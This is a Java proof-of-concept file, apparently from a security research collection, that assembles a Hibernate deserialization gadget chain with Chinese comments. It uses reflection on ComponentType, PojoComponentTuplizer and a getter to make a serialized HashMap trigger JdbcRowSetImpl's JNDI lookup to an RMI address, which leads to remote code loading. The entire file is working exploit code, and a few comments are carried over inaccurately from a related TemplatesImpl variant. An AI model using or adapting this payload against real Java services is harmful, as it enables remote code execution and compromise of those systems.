package com.javasec.pocs.hibernate;

import com.javasec.utils.SerializeUtils;
import com.sun.rowset.JdbcRowSetImpl;
import org.hibernate.engine.spi.TypedValue;
import org.hibernate.type.Type;
import java.lang.reflect.Array;
import java.lang.reflect.Field;
import java.lang.reflect.Method;
import java.util.HashMap;

/**
 * 原理同hibernate1,只是为jndi方法
 */
public class hibernate2 {
    public static void main(String[] args) throws Exception{
        Class<?> componentTypeClass             = Class.forName("org.hibernate.type.ComponentType");
        Class<?> pojoComponentTuplizerClass     = Class.forName("org.hibernate.tuple.component.PojoComponentTuplizer");
        Class<?> abstractComponentTuplizerClass = Class.forName("org.hibernate.tuple.component.AbstractComponentTuplizer");


        // 生成JdbcRowxxx
        JdbcRowSetImpl rs = new JdbcRowSetImpl();
        rs.setDataSourceName("rmi://localhost:8998/myhome");
        Method method = JdbcRowSetImpl.class.getDeclaredMethod("getDatabaseMetaData");
        Object getter=null;
        try {
            // 创建 GetterMethodImpl 实例，用来触发 TemplatesImpl 的 getOutputProperties 方法
            getter=SerializeUtils.newInstance("org.hibernate.property.access.spi.GetterMethodImpl",null,null,method);

        } catch (Exception ignored) {
            // 创建 BasicGetter 实例，用来触发 TemplatesImpl 的 getOutputProperties 方法
            getter=SerializeUtils.newInstance("org.hibernate.property.BasicPropertyAccessor$BasicGetter",new Class[]{Class.class,Method.class,String.class},rs.getClass(),method,"outputProperties");
        }

        // 创建 PojoComponentTuplizer 实例，用来触发 Getter 方法
        Object tuplizer = SerializeUtils.createWithoutConstructor(pojoComponentTuplizerClass);

        // 反射将 BasicGetter 写入 PojoComponentTuplizer 的成员变量 getters 里
        Field field = abstractComponentTuplizerClass.getDeclaredField("getters");
        field.setAccessible(true);
        Object getters = Array.newInstance(getter.getClass(), 1);
        Array.set(getters, 0, getter);
        field.set(tuplizer, getters);

        // 创建 ComponentType 实例，用来触发 PojoComponentTuplizer 的 getPropertyValues 方法
        Object type = SerializeUtils.createWithoutConstructor(componentTypeClass);

        // 反射将相关值写入，满足 ComponentType 的 getHashCode 调用所需条件
        SerializeUtils.setFieldValue(type,"componentTuplizer",tuplizer);
        SerializeUtils.setFieldValue(type,"propertySpan",1);
        SerializeUtils.setFieldValue(type,"propertyTypes",new Type[]{(Type) type});

        // 创建 TypedValue 实例，用来触发 ComponentType 的 getHashCode 方法
        TypedValue typedValue = new TypedValue((Type) type, null);

        // 创建反序列化用 HashMap
        HashMap<Object, Object> hashMap = new HashMap<>();
        hashMap.put(typedValue, "su18");

        // put 到 hashmap 之后再反射写入，防止 put 时触发
        SerializeUtils.setFieldValue(typedValue,"value",rs);
        SerializeUtils.deserTester(hashMap);
    }
}
